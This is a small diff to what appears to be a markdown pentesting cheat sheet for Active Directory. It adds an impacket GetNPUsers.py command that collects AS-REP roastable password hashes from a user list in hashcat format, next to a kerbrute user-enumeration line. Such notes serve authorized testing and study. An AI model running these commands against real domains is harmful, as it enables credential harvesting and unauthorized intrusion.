@@ -66,8 +66,8 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 
 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
 
-```
-
+```shell
+python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
 ```
 
 ### :open_file_folder: PowerView
